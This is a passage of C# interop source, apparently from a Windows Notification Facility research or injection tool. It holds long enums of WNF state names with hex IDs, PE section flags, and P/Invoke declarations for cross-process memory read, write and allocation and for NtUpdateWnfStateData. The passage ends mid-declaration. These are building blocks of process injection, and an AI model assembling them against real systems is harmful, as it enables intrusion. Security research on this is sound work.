        WNF_STOR_CONFIGURATION_MO_TASK_RUNNING = 0x13891a3ea3bc1075,
        WNF_STOR_CONFIGURATION_OEM_TASK_RUNNING = 0x13891a3ea3bc1875,
        WNF_SUPP_ENABLE_ERROR_DETAILS_CACHE = 0x11961b3ea3bc0875,
        WNF_SYNC_REQUEST_PROBE = 0x288173ea3bc0875,
        WNF_SYS_SHUTDOWN_IN_PROGRESS = 0x4195173ea3bc0875,
        WNF_TB_SYSTEM_TIME_CHANGED = 0x41c60c39a3bc0875,
        WNF_TEAM_SHELL_HOTKEY_PRESSED = 0xc870b39a3bc0875,
        WNF_TEL_DAILY_UPLOAD_QUOTA = 0x418a0b39a3be1075,
        WNF_TEL_ONESETTINGS_UPDATED = 0x418a0b39a3be1875,
        WNF_TEL_SETTINGS_PUSH_NOTIFICATION_RECEIVED = 0x418a0b39a3be2075,
        WNF_TEL_STORAGE_CAPACITY = 0x418a0b39a3be0875,
        WNF_TEL_TIMER_RECONFIGURED = 0x418a0b39a3be2875,
        WNF_TETH_AUTOSTART_BLUETOOTH = 0x9920b39a3bc1075,
        WNF_TETH_TETHERING_STATE = 0x9920b39a3bc0875,
        WNF_THME_THEME_CHANGED = 0x48b0639a3bc0875,
        WNF_TKBN_AUTOCOMPLETE = 0xf840539a3bc4835,
        WNF_TKBN_CANDIDATE_WINDOW_STATE = 0xf840539a3bc7835,
        WNF_TKBN_CARET_TRACKING = 0xf840539a3bc4035,
        WNF_TKBN_COMPOSITION_STATE = 0xf840539a3bc9035,
        WNF_TKBN_DESKTOP_MODE_AUTO_IHM = 0xf840539a3bcb035,
        WNF_TKBN_FOREGROUND_WINDOW = 0xf840539a3bc3835,
        WNF_TKBN_IMMERSIVE_FOCUS_TRACKING = 0xf840539a3bc1835,
        WNF_TKBN_INPUT_PANE_DISPLAY_POLICY = 0xf840539a3bca835,
        WNF_TKBN_KEYBOARD_GESTURE = 0xf840539a3bc6835,
        WNF_TKBN_KEYBOARD_LAYOUT_CHANGE = 0xf840539a3bc8035,
        WNF_TKBN_KEYBOARD_SET_VISIBLE = 0xf840539a3bcb835,
        WNF_TKBN_KEYBOARD_SET_VISIBLE_NOTIFICATION = 0xf840539a3bcc035,
        WNF_TKBN_KEYBOARD_VIEW_CHANGE = 0xf840539a3bc5835,
        WNF_TKBN_KEYBOARD_VISIBILITY = 0xf840539a3bc0835,
        WNF_TKBN_LANGUAGE = 0xf840539a3bc3035,
        WNF_TKBN_MODERN_KEYBOARD_FOCUS_TRACKING = 0xf840539a3bc5035,
        WNF_TKBN_RESTRICTED_KEYBOARD_GESTURE = 0xf840539a3bc7035,
        WNF_TKBN_RESTRICTED_KEYBOARD_LAYOUT_CHANGE = 0xf840539a3bc8835,
        WNF_TKBN_RESTRICTED_KEYBOARD_VIEW_CHANGE = 0xf840539a3bc6035,
        WNF_TKBN_RESTRICTED_KEYBOARD_VISIBILITY = 0xf840539a3bc1035,
        WNF_TKBN_RESTRICTED_TOUCH_EVENT = 0xf840539a3bc2835,
        WNF_TKBN_SYSTEM_IMMERSIVE_FOCUS_TRACKING = 0xf840539a3bc9835,
        WNF_TKBN_SYSTEM_TOUCH_EVENT = 0xf840539a3bca035,
        WNF_TKBN_TOUCH_EVENT = 0xf840539a3bc2035,
        WNF_TKBR_CHANGE_APP = 0x13840539a3bc1075,
        WNF_TKBR_CHANGE_APP_INTERNAL = 0x13840539a3bc18f5,
        WNF_TKBR_CHANGE_SYSTEM = 0x13840539a3bc08f5,
        WNF_TMCN_ISTABLETMODE = 0xf850339a3bc0835,
        WNF_TOPE_INP_POINTER_DEVICE_ACTIVITY = 0x4960139a3bc0875,
        WNF_TPM_CLEAR_PENDING = 0x418b1e39a3bc2075,
        WNF_TPM_CLEAR_RESULT = 0x418b1e39a3bc2875,
        WNF_TPM_DEVICEID_STATE = 0x418b1e39a3bc1075,
        WNF_TPM_DISABLE_DEACTIVATE_PENDING = 0x418b1e39a3bc3075,
        WNF_TPM_ENABLE_ACTIVATE_COMPLETED = 0x418b1e39a3bc3875,
        WNF_TPM_MAINTENANCE_TASK_STATUS = 0x418b1e39a3bc4075,
        WNF_TPM_OWNERSHIP_TAKEN = 0x418b1e39a3bc0875,
        WNF_TPM_PROVISION_TRIGGER = 0x418b1e39a3bc1875,
        WNF_TZ_AUTOTIMEUPDATE_STATE_CHANGED = 0x41c61439a3bc3075,
        WNF_TZ_LAST_TIME_SYNC_INFO = 0x41c61439a3bc2075,
        WNF_TZ_LEGACY_STORE_CHANGED = 0x41c61439a3bc0875,
        WNF_TZ_NETWORK_TIME_SYNC_TRIGGER = 0x41c61439a3bc2875,
        WNF_TZ_STORE_CHANGED = 0x41c61439a3bc1075,
        WNF_TZ_TIMEZONE_CHANGED = 0x41c61439a3bc1875,
        WNF_UBPM_CONSOLE_MONITOR = 0xc960c38a3bc1075,
        WNF_UBPM_FRMU_ALLOWED = 0xc960c38a3bc1875,
        WNF_UBPM_POWER_SOURCE = 0xc960c38a3bc0875,
        WNF_UBPM_PRESHUTDOWN_PHASE = 0xc960c38a3bc2075,
        WNF_UDA_CONTACT_SORT_CHANGED = 0x41870a38a3bc2835,
        WNF_UDM_SERVICE_INITIALIZED = 0x418b0a38a3bc0835,
        WNF_UMDF_DRVMGR_STATUS = 0x7820338a3bc1075,
        WNF_UMDF_WUDFSVC_START = 0x7820338a3bc0875,
        WNF_UMGR_SESSIONUSER_TOKEN_CHANGE = 0x13810338a3bc2875,
        WNF_UMGR_SESSION_ACTIVE_SHELL_USER_CHANGE = 0x13810338a3bc3035,
        WNF_UMGR_SIHOST_READY = 0x13810338a3bc0835,
        WNF_UMGR_SYSTEM_USER_CONTEXT_CHANGED = 0x13810338a3bc2075,
        WNF_UMGR_USER_LOGIN = 0x13810338a3bc1075,
        WNF_UMGR_USER_LOGOUT = 0x13810338a3bc1875,
        WNF_UMGR_USER_TILE_CHANGED = 0x13810338a3bc3875,
        WNF_USB_BILLBOARD_CHANGE = 0x41841d38a3bc1075,
        WNF_USB_CHARGING_STATE = 0x41841d38a3bc2075,
        WNF_USB_ERROR_NOTIFICATION = 0x41841d38a3bc3075,
        WNF_USB_FUNCTION_CONTROLLER_STATE = 0x41841d38a3bc2875,
        WNF_USB_PEER_DEVICE_STATE = 0x41841d38a3bc1875,
        WNF_USB_POLICY_MANAGER_HUB_COLLECTION_STATE = 0x41841d38a3bc3875,
        WNF_USB_TYPE_C_PARTNER_STATE = 0x41841d38a3bc0875,
        WNF_USB_XHCI_AUDIO_OFFLOAD_STATE = 0x41841d38a3bc4075,
        WNF_USO_ACTIVEHOURS_STARTED = 0x41891d38a3bc7075,
        WNF_USO_ACTIVE_SESSION = 0x41891d38a3bc2875,
        WNF_USO_DOWNLOAD_STARTED = 0x41891d38a3bc4875,
        WNF_USO_INSTALL_STARTED = 0x41891d38a3bc5075,
        WNF_USO_INSTALL_STATE = 0x41891d38a3bc5875,
        WNF_USO_REBOOT_BLOCK_REQUESTED = 0x41891d38a3bc4075,
        WNF_USO_REBOOT_REQUIRED = 0x41891d38a3bc2075,
        WNF_USO_SERVICE_STOPPING = 0x41891d38a3bc6075,
        WNF_USO_SETTINGS_REFRESHED = 0x41891d38a3bc6875,
        WNF_USO_STATE_ATTENTION_REQUIRED = 0x41891d38a3bc1075,
        WNF_USO_STATE_CHANGE = 0x41891d38a3bc0875,
        WNF_USO_UPDATE_PROGRESS = 0x41891d38a3bc1875,
        WNF_USO_UPDATE_SUCCEEDED = 0x41891d38a3bc3075,
        WNF_USO_UPTODATE_STATUS_CHANGED = 0x41891d38a3bc3875,
        WNF_UTS_LOCKSCREEN_DISMISSAL_TRIGGERED = 0x41951a38a3bc1475,
        WNF_UTS_USERS_ENROLLED = 0x41951a38a3bc0c75,
        WNF_UWF_OVERLAY_CRITICAL = 0x41801938a3bc1075,
        WNF_UWF_OVERLAY_NORMAL = 0x41801938a3bc1875,
        WNF_UWF_OVERLAY_WARNING = 0x41801938a3bc0875,
        WNF_VAN_VANUI_STATUS = 0x41880f3ba3bc0875,
        WNF_VPN_CLIENT_CONNECTIVITY_STATUS = 0x41881e3ba3bc0875,
        WNF_VTSV_ADD_CRED_NOTIFY = 0x17951a3ba3bc1075,
        WNF_VTSV_CDS_SYNC = 0x17951a3ba3bc0875,
        WNF_WAAS_FEATURE_IMPACT = 0x12870f3aa3bc1075,
        WNF_WAAS_QUALITY_IMPACT = 0x12870f3aa3bc0875,
        WNF_WBIO_ENROLLMENT_FINISHED = 0xe8f0c3aa3bc0875,
        WNF_WCDS_SYNC_WLAN = 0x12820d3aa3bc0875,
        WNF_WCM_INTERFACE_CONNECTION_STATE = 0x418b0d3aa3bc2875,
        WNF_WCM_INTERFACE_LIST = 0x418b0d3aa3bc0875,
        WNF_WCM_MAPPING_POLICY_UPDATED = 0x418b0d3aa3bc1875,
        WNF_WCM_PROFILE_CONFIG_UPDATED = 0x418b0d3aa3bc2075,
        WNF_WCM_SERVICE_STATUS = 0x418b0d3aa3bc1075,
        WNF_WDAG_SETTINGS_CHANGED_SYSTEM = 0x6870a3aa3bc1075,
        WNF_WDAG_SETTINGS_CHANGED_USER = 0x6870a3aa3bc0875,
        WNF_WDSC_ACCOUNT_PROTECTION_REFRESH = 0x2950a3aa3bc0875,
        WNF_WEBA_CTAP_DEVICE_CHANGE_NOTIFY = 0x840b3aa3bc1075,
        WNF_WEBA_CTAP_DEVICE_STATE = 0x840b3aa3bc0875,
        WNF_WER_CRASH_STATE = 0x41940b3aa3bc1875,
        WNF_WER_QUEUED_REPORTS = 0x41940b3aa3bc1075,
        WNF_WER_SERVICE_START = 0x41940b3aa3bc0875,
        WNF_WFAS_FIREWALL_NETWORK_CHANGE_READY = 0x1287083aa3bc0875,
        WNF_WFDN_MOVEMENT_DETECTED = 0xf82083aa3bc1075,
        WNF_WFDN_STAY_CONNECTED_TRIGGER = 0xf82083aa3bc1875,
        WNF_WFDN_WFD_DISCONNECTION_PROPERTIES = 0xf82083aa3bc0875,
        WNF_WFS_FAMILYMEMBERLOGIN = 0x4195083aa3bc1875,
        WNF_WFS_SETTINGS = 0x4195083aa3bc0875,
        WNF_WFS_SETTINGSREFRESH = 0x4195083aa3bc2075,
        WNF_WFS_TIMEREMAININGALERTS = 0x4195083aa3bc1075,
        WNF_WHTP_WINHTTP_PROXY_AUTHENTICATION_REQUIRED = 0x1192063aa3bc1075,
        WNF_WHTP_WINHTTP_PROXY_DISCOVERED = 0x1192063aa3bc0875,
        WNF_WIFI_AOAC_STATUS = 0x880073aa3bc4875,
        WNF_WIFI_AVERAGE_TRANSMIT = 0x880073aa3bc6875,
        WNF_WIFI_CONNECTION_SCORE = 0x880073aa3bc5875,
        WNF_WIFI_CONNECTION_STATUS = 0x880073aa3bc0875,
        WNF_WIFI_CPL_STATUS = 0x880073aa3bc1075,
        WNF_WIFI_HOTSPOT2_REGISTRATION_STATUS = 0x880073aa3bc9075,
        WNF_WIFI_HOTSPOT_HOST_READY = 0x880073aa3bc2875,
        WNF_WIFI_L3_AUTH_STATE = 0x880073aa3bc8075,
        WNF_WIFI_MEDIA_STREAMING_MODE = 0x880073aa3bc7075,
        WNF_WIFI_MOVEMENT_DETECTED = 0x880073aa3bca075,
        WNF_WIFI_PROTECTED_SCENARIO = 0x880073aa3bc9875,
        WNF_WIFI_SERVICE_NOTIFICATIONS = 0x880073aa3bc2075,
        WNF_WIFI_TASK_TRIGGER = 0x880073aa3bc7875,
        WNF_WIFI_TILE_UPDATE = 0x880073aa3bc6075,
        WNF_WIFI_WLANSVC_NOTIFICATION = 0x880073aa3bc8875,
        WNF_WIL_BOOT_FEATURE_STORE = 0x418a073aa3bc1475,
        WNF_WIL_FEATURE_DEVICE_USAGE_TRACKING_1 = 0x418a073aa3bc1c75,
        WNF_WIL_FEATURE_DEVICE_USAGE_TRACKING_2 = 0x418a073aa3bc2475,
        WNF_WIL_FEATURE_DEVICE_USAGE_TRACKING_3 = 0x418a073aa3bc2c75,
        WNF_WIL_FEATURE_HEALTH_TRACKING_1 = 0x418a073aa3bc4c75,
        WNF_WIL_FEATURE_HEALTH_TRACKING_2 = 0x418a073aa3bc5475,
        WNF_WIL_FEATURE_HEALTH_TRACKING_3 = 0x418a073aa3bc5c75,
        WNF_WIL_FEATURE_HEALTH_TRACKING_4 = 0x418a073aa3bc6475,
        WNF_WIL_FEATURE_HEALTH_TRACKING_5 = 0x418a073aa3bc6c75,
        WNF_WIL_FEATURE_HEALTH_TRACKING_6 = 0x418a073aa3bc7475,
        WNF_WIL_FEATURE_STORE = 0x418a073aa3bc0c75,
        WNF_WIL_FEATURE_USAGE_FOR_SRUM = 0x418a073aa3bc9835,
        WNF_WIL_FEATURE_USAGE_TRACKING_1 = 0x418a073aa3bc3475,
        WNF_WIL_FEATURE_USAGE_TRACKING_2 = 0x418a073aa3bc3c75,
        WNF_WIL_FEATURE_USAGE_TRACKING_3 = 0x418a073aa3bc4475,
        WNF_WIL_MACHINE_FEATURE_STORE = 0x418a073aa3bc7c75,
        WNF_WIL_MACHINE_FEATURE_STORE_MODIFIED = 0x418a073aa3bc8075,
        WNF_WIL_USER_FEATURE_STORE = 0x418a073aa3bc88f5,
        WNF_WIL_USER_FEATURE_STORE_MODIFIED = 0x418a073aa3bc90f5,
        WNF_WNS_CONNECTIVITY_STATUS = 0x4195003aa3bc0875,
        WNF_WOF_OVERLAY_CONFIGURATION_CHANGE = 0x4180013aa3bc0875,
        WNF_WOSC_DIRECTX_DATABASE_CHANGED = 0x295013aa3bc2075,
        WNF_WOSC_FEATURE_CONFIGURATION_CHANGED = 0x295013aa3bc1075,
        WNF_WOSC_FEATURE_CONFIGURATION_COMPLETED = 0x295013aa3bc3075,
        WNF_WOSC_MITIGATION_CONFIGURATION_CHANGED = 0x295013aa3bc1875,
        WNF_WOSC_ML_MODELS_CHANGED = 0x295013aa3bc0875,
        WNF_WOSC_MUSE_CONFIGURATION_CHANGED = 0x295013aa3bc2875,
        WNF_WPN_PLATFORM_INITIALIZED = 0x41881e3aa3bc10f5,
        WNF_WPN_SYSTEM_PLATFORM_READY = 0x41881e3aa3bc1875,
        WNF_WPN_USER_IN_SESSION_PLATFORM_READY = 0x41881e3aa3bc2035,
        WNF_WPN_USER_PLATFORM_READY = 0x41881e3aa3bc08f5,
        WNF_WSC_SECURITY_CENTER_USER_NOTIFICATION = 0x41851d3aa3bc0875,
        WNF_WSQM_IS_OPTED_IN = 0xc971d3aa3bc0875,
        WNF_WUA_AU_SCAN_COMPLETE = 0x41871b3aa3bc1075,
        WNF_WUA_CALL_HANG = 0x41871b3aa3bc1875,
        WNF_WUA_NUM_PER_USER_UPDATES = 0x41871b3aa3bc08f5,
        WNF_WUA_SERVICE_HANG = 0x41871b3aa3bc2075,
        WNF_WUA_STAGEUPDATE_DETAILS = 0x41871b3aa3bc2875,
        WNF_WUA_UPDATE_EXPIRING = 0x41871b3aa3bc3075,
        WNF_WWAN_CELLULAR_STATE_SNAPSHOT_CHANGE = 0xf87193aa3bc1875,
        WNF_WWAN_EUICC_ARRIVAL = 0xf87193aa3bc1075,
        WNF_WWAN_OBJECT_LIST = 0xf87193aa3bc0875,
        WNF_WWAN_TASK_TRIGGER = 0xf87193aa3bc2075,
        WNF_XBOX_ACCESSIBILITY_EXCLUSIVE_INPUT_MODE_CHANGED = 0x19890c35a3be9075,
        WNF_XBOX_ACCESSIBILITY_NARRATOR_ENABLED = 0x19890c35a3bdf075,
        WNF_XBOX_ACHIEVEMENTS_RAW_NOTIFICATION_RECEIVED = 0x19890c35a3bc8075,
        WNF_XBOX_ACHIEVEMENT_TRACKER_STATE_CHANGED = 0x19890c35a3bea075,
        WNF_XBOX_ACTIVE_BACKGROUNDAUDIO_APPLICATION_CHANGED = 0x19890c35a3be5875,
        WNF_XBOX_ADJUST_SNAP_CPU_AFFINITY = 0x19890c35a3be3075,
        WNF_XBOX_APPLICATION_ACTIVATING = 0x19890c35a3bc1875,
        WNF_XBOX_APPLICATION_COMPONENT_FOCUS = 0x19890c35a3bc2075,
        WNF_XBOX_APPLICATION_COM_RESILIENCY_STATUS_CHANGED = 0x19890c35a3bcd875,
        WNF_XBOX_APPLICATION_CONTEXT_CHANGED = 0x19890c35a3bc0875,
        WNF_XBOX_APPLICATION_CURRENT_USER_CHANGED = 0x19890c35a3be0075,
        WNF_XBOX_APPLICATION_ERROR = 0x19890c35a3bc6075,
        WNF_XBOX_APPLICATION_FOCUS_CHANGED = 0x19890c35a3bc1075,
        WNF_XBOX_APPLICATION_LAYOUT_CHANGED = 0x19890c35a3bc9075,
        WNF_XBOX_APPLICATION_LICENSE_CHANGED = 0x19890c35a3bd0075,
        WNF_XBOX_APPLICATION_NO_LONGER_RUNNING = 0x19890c35a3bc5075,
        WNF_XBOX_AUTOPLAY_CONTENT_DETECTED = 0x19890c35a3bc5875,
        WNF_XBOX_AUTO_SIGNIN_IN_PROGRESS = 0x19890c35a3bde075,
        WNF_XBOX_CLOUD_SETTINGS_UPDATED = 0x19890c35a3bf2075,
        WNF_XBOX_CLUBCHAT_RAW_NOTIFICATION_RECEIVED = 0x19890c35a3bef075,
        WNF_XBOX_CLUB_RAW_NOTIFICATION_RECEIVED = 0x19890c35a3bee875,
        WNF_XBOX_COMMANDSERVICE_RAW_NOTIFICATION_RECEIVED = 0x19890c35a3bf6075,
        WNF_XBOX_COPYONLAN_UPLOAD_STATE_CHANGED = 0x19890c35a3bf5075,
        WNF_XBOX_CORTANAOVERLAY_VISIBILITY_CHANGED = 0x19890c35a3bdc875,
        WNF_XBOX_CORTANA_SIGNEDIN_USERS_GRAMMAR_UPDATE_NOTIFICATION = 0x19890c35a3be2075,
        WNF_XBOX_CORTANA_TV_GRAMMAR_UPDATE_NOTIFICATION = 0x19890c35a3be1875,
        WNF_XBOX_CORTANA_USER_CHANGED_UPDATE_NOTIFICATION = 0x19890c35a3be8875,
        WNF_XBOX_DASHBOARD_DIRECT_ACTIVATION = 0x19890c35a3bf5875,
        WNF_XBOX_ERA_FAST_ITERATION_STATUS_CHANGED = 0x19890c35a3bf2875,
        WNF_XBOX_ERA_TITLE_LAUNCH_NOTIFICATION = 0x19890c35a3bd5875,
        WNF_XBOX_ERA_VM_INSTANCE_CHANGED = 0x19890c35a3be0875,
        WNF_XBOX_ERA_VM_IOPRIORITY_CHANGED = 0x19890c35a3be7075,
        WNF_XBOX_ERA_VM_STATUS_CHANGED = 0x19890c35a3bc8875,
        WNF_XBOX_EXIT_SILENT_BOOT_MODE = 0x19890c35a3bcf875,
        WNF_XBOX_EXPANDED_RESOURCES_INACTIVE = 0x19890c35a3bf0875,
        WNF_XBOX_EXTENDED_RESOURCE_MODE_CHANGED = 0x19890c35a3bdd875,
        WNF_XBOX_GAMECORE_TITLE_LAUNCH_NOTIFICATION = 0x19890c35a3bf8075,
        WNF_XBOX_GAMER_ACCOUNT_CHANGED = 0x19890c35a3be6875,
        WNF_XBOX_GLOBALIZATION_SETTING_CHANGED = 0x19890c35a3bc4875,
        WNF_XBOX_GLOBAL_SPEECH_INPUT_NOTIFICATION = 0x19890c35a3bdf875,
        WNF_XBOX_GUEST_VM_CRASH_DUMP_NOTIFICATION = 0x19890c35a3bf7075,
        WNF_XBOX_GUIDE_DIRECT_ACTIVATION = 0x19890c35a3bea875,
        WNF_XBOX_HOST_STORAGE_CONFIGURATION_CHANGED = 0x19890c35a3bcf075,
        WNF_XBOX_HOST_XVC_CORRUPTION_DETECTED = 0x19890c35a3bf8875,
        WNF_XBOX_IDLE_DIMMER_CHANGED = 0x19890c35a3bc4075,
        WNF_XBOX_KEYBOARD_LOCALE_CHANGED = 0x19890c35a3be6075,
        WNF_XBOX_KINECT_IS_REQUIRED = 0x19890c35a3be2875,
        WNF_XBOX_LIBRARY_RAW_NOTIFICATION_RECEIVED = 0x19890c35a3beb875,
        WNF_XBOX_LIVETV_RAW_NOTIFICATION_RECEIVED = 0x19890c35a3bed875,
        WNF_XBOX_LIVETV_TUNER_COUNT_CHANGED = 0x19890c35a3bd9075,
        WNF_XBOX_LIVE_CONNECTIVITY_CHANGED = 0x19890c35a3bc7075,
        WNF_XBOX_MEDIA_IS_PLAYING_CHANGED = 0x19890c35a3bf0075,
        WNF_XBOX_MESSAGING_RAW_NOTIFICATION_RECEIVED = 0x19890c35a3bec075,
        WNF_XBOX_MSA_ENVIRONMENT_CONFIGURED = 0x19890c35a3bd2075,
        WNF_XBOX_MULTIPLAYER_RAW_NOTIFICATION_RECEIVED = 0x19890c35a3bed075,
        WNF_XBOX_NARRATOR_INPUT_LEARNING_MODE_CHANGED = 0x19890c35a3bf3875,
        WNF_XBOX_NARRATOR_RECT_CHANGED = 0x19890c35a3bda875,
        WNF_XBOX_NEON_SETTING_CHANGED = 0x19890c35a3bf4875,
        WNF_XBOX_NOTIFICATION_SETTING_CHANGED = 0x19890c35a3bf6875,
        WNF_XBOX_NOTIFICATION_UNREAD_COUNT = 0x19890c35a3bdd075,
        WNF_XBOX_NTM_CONSTRAINED_MODE_CHANGED = 0x19890c35a3bf3075,
        WNF_XBOX_PACKAGECACHE_CHANGED = 0x19890c35a3bd9875,
        WNF_XBOX_PACKAGE_INSTALL_STATE_CHANGED = 0x19890c35a3bc3875,
        WNF_XBOX_PACKAGE_STREAMING_STATE = 0x19890c35a3bd7075,
        WNF_XBOX_PACKAGE_UNMOUNTED_FROM_SYSTEM_FOR_LAUNCH = 0x19890c35a3bc3075,
        WNF_XBOX_PACKAGE_UNMOUNTED_FROM_SYSTEM_FOR_UNINSTALL = 0x19890c35a3bdb075,
        WNF_XBOX_PARENTAL_RESTRICTIONS_CHANGED = 0x19890c35a3bf1075,
        WNF_XBOX_PARTY_OVERLAY_STATE_CHANGED = 0x19890c35a3bf1875,
        WNF_XBOX_PASS3_UPDATE_NOTIFICATION = 0x19890c35a3bd1875,
        WNF_XBOX_PEOPLE_RAW_NOTIFICATION_RECEIVED = 0x19890c35a3bec875,
        WNF_XBOX_PROACTIVE_NOTIFICATION_TRIGGERED = 0x19890c35a3be9875,
        WNF_XBOX_QUERY_UPDATE_NOTIFICATION = 0x19890c35a3bd8075,
        WNF_XBOX_REMOTE_SIGNOUT = 0x19890c35a3bde875,
        WNF_XBOX_REPOSITORY_CHANGED = 0x19890c35a3bd8875,
        WNF_XBOX_RESET_IDLE_TIMER = 0x19890c35a3be1075,
        WNF_XBOX_SAFEAREA_SETTING_CHANGED = 0x19890c35a3be5075,
        WNF_XBOX_SEND_LTV_COMMAND_REQUESTED = 0x19890c35a3bdb875,
        WNF_XBOX_SETTINGS_RAW_NOTIFICATION_RECEIVED = 0x19890c35a3bef875,
        WNF_XBOX_SHELL_DATACACHE_ENTITY_CHANGED = 0x19890c35a3bdc075,
        WNF_XBOX_SHELL_INITIALIZED = 0x19890c35a3bd0875,
        WNF_XBOX_SHELL_TOAST_NOTIFICATION = 0x19890c35a3bc2875,
        WNF_XBOX_SIP_FOCUS_TRANSFER_NOTIFICATION = 0x19890c35a3bd3875,
        WNF_XBOX_SIP_VISIBILITY_CHANGED = 0x19890c35a3bd2875,
        WNF_XBOX_SPEECH_INPUT_DEVICE = 0x19890c35a3be7875,
        WNF_XBOX_STORAGE_CHANGED = 0x19890c35a3bd6875,
        WNF_XBOX_STORAGE_ERROR = 0x19890c35a3bc6875,
        WNF_XBOX_STORAGE_STATUS = 0x19890c35a3bd6075,
        WNF_XBOX_STREAMING_QUEUE_CHANGED = 0x19890c35a3bd7875,
        WNF_XBOX_SUSPEND_SKELETAL_TRACKING_INITIALIZATION = 0x19890c35a3bf4075,
        WNF_XBOX_SYSTEMUI_RAW_NOTIFICATION_RECEIVED = 0x19890c35a3bee075,
        WNF_XBOX_SYSTEM_CONSTRAINED_MODE_STATUS_CHANGED = 0x19890c35a3bca075,
        WNF_XBOX_SYSTEM_GAME_STREAMING_STATE_CHANGED = 0x19890c35a3bd3075,
        WNF_XBOX_SYSTEM_IDLE_TIMEOUT_CHANGED = 0x19890c35a3bc9875,
        WNF_XBOX_SYSTEM_LOW_POWER_MAINTENANCE_WORK_ALLOWED = 0x19890c35a3bd5075,
        WNF_XBOX_SYSTEM_TITLE_AUTH_STATUS_CHANGED = 0x19890c35a3bc7875,
        WNF_XBOX_SYSTEM_USER_CONTEXT_CHANGED = 0x19890c35a3bce075,
        WNF_XBOX_TEST_NETWORK_CONNECTION_COMPLETE = 0x19890c35a3bf7875,
        WNF_XBOX_TITLE_SPOP_VETO_RECEIVED = 0x19890c35a3beb075,
        WNF_XBOX_VIDEOPLAYER_ACTIVEPLAYER = 0x19890c35a3be3875,
        WNF_XBOX_VIDEOPLAYER_PLAYBACKPROGRESS = 0x19890c35a3be4875,
        WNF_XBOX_VIDEOPLAYER_PLAYERSTATE = 0x19890c35a3be4075,
        WNF_XBOX_WPN_PLATFORM_HOST_INITIALIZED = 0x19890c35a3bda075,
        WNF_XBOX_XAM_SMB_SHARES_INIT_ALLOW_SYSTEM_READY = 0x19890c35a3bd4075,
        WNF_XBOX_XBBLACKBOX_SNAP_NOTIFICATION = 0x19890c35a3bd4875
    }

    [Flags]
    public enum SectionFlags : uint
    {
        TYPE_NO_PAD = 0x00000008,
        CNT_CODE = 0x00000020,
        CNT_INITIALIZED_DATA = 0x00000040,
        CNT_UNINITIALIZED_DATA = 0x00000080,
        LNK_INFO = 0x00000200,
        LNK_REMOVE = 0x00000800,
        LNK_COMDAT = 0x00001000,
        NO_DEFER_SPEC_EXC = 0x00004000,
        GPREL = 0x00008000,
        MEM_FARDATA = 0x00008000,
        MEM_PURGEABLE = 0x00020000,
        MEM_16BIT = 0x00020000,
        MEM_LOCKED = 0x00040000,
        MEM_PRELOAD = 0x00080000,
        ALIGN_1BYTES = 0x00100000,
        ALIGN_2BYTES = 0x00200000,
        ALIGN_4BYTES = 0x00300000,
        ALIGN_8BYTES = 0x00400000,
        ALIGN_16BYTES = 0x00500000,
        ALIGN_32BYTES = 0x00600000,
        ALIGN_64BYTES = 0x00700000,
        ALIGN_128BYTES = 0x00800000,
        ALIGN_256BYTES = 0x00900000,
        ALIGN_512BYTES = 0x00A00000,
        ALIGN_1024BYTES = 0x00B00000,
        ALIGN_2048BYTES = 0x00C00000,
        ALIGN_4096BYTES = 0x00D00000,
        ALIGN_8192BYTES = 0x00E00000,
        ALIGN_MASK = 0x00F00000,
        LNK_NRELOC_OVFL = 0x01000000,
        MEM_DISCARDABLE = 0x02000000,
        MEM_NOT_CACHED = 0x04000000,
        MEM_NOT_PAGED = 0x08000000,
        MEM_SHARED = 0x10000000,
        MEM_EXECUTE = 0x20000000,
        MEM_READ = 0x40000000,
        MEM_WRITE = 0x80000000
    }

    public enum WnfNodeTypeCode : int
    {
        WNF_NODE_SUBSCRIPTION_TABLE = 0x911,
        WNF_NODE_NAME_SUBSCRIPTION = 0x912,
        WNF_NODE_SERIALIZATION_GROUP = 0x913,
        WNF_NODE_USER_SUBSCRIPTION = 0x914
    }

    // APIs
    //-----------------------------------
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(
        UInt32 processAccess,
        bool bInheritHandle,
        int processId);

    [DllImport("dbghelp.dll")]
    public static extern bool SymInitialize(
        IntPtr ProcessHandle,
        IntPtr UserSearchPath,
        bool InvadeProcess);

    [DllImport("dbghelp.dll", SetLastError = true)]
    public static extern bool SymGetSymFromAddr64(
        IntPtr hProcess,
        long Address,
        ref long OffestFromSymbol,
        IntPtr Symbol);

    [DllImport("kernel32.dll")]
    public static extern void GetSystemInfo(
        ref SYSTEM_INFORMATION lpSystemInfo);

    [DllImport("kernel32.dll")]
    public static extern bool IsWow64Process(
        IntPtr hProcess,
        ref bool Wow64Process);

    [DllImport("psapi.dll")]
    public static extern uint GetMappedFileNameW(
        IntPtr hProcess,
        IntPtr lpv,
        [MarshalAs(UnmanagedType.LPTStr)]
            System.Text.StringBuilder lpFilename,
        uint nSize);

    [DllImport("kernel32.dll")]
    public static extern int VirtualQuery(
        IntPtr lpAddress,
        ref MEMORY_BASIC_INFORMATION lpBuffer,
        int dwLength);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string dllToLoad);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern Boolean ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        IntPtr lpBuffer,
        UInt32 dwSize,
        ref UInt32 lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        ref UInt32 lpNumberOfBytesWritten);

    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(
        string lpClassName,
        string lpWindowName);

    [DllImport("user32.dll")]
    public static extern int GetWindowThreadProcessId(
        IntPtr hWnd,
        ref int lpdwProcessId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        int flAllocationType,
        int flProtect);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern bool VirtualFreeEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        UInt32 dwSize,
        UInt32 dwFreeType);

    [DllImport("kernel32.dll")]
    public static extern Boolean CloseHandle(
        IntPtr hObject);

    // https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/NtWnfNative.cs#L74
    [DllImport("ntdll.dll")]
    public static extern UInt32 NtUpdateWnfStateData(
        ref ulong StateName,
        IntPtr Buffer,
        int Length,
        [In, Optional] WnfTypeId TypeId,
        [Optional] IntPtr ExplicitScope,
        int MatchingChangeStamp,
